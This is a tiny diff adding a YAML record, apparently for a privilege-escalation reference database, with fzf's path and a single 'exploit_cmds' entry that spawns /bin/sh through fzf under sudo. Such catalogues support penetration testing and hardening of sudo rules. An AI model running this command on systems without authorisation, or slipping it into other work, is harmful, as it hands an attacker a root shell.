@@ -1,0 +1,4 @@
+name: fzf
+binary_path: /usr/bin/fzf
+exploit_cmds:
+- sudo /usr/bin/fzf --bind 'enter:execute(/bin/sh)'
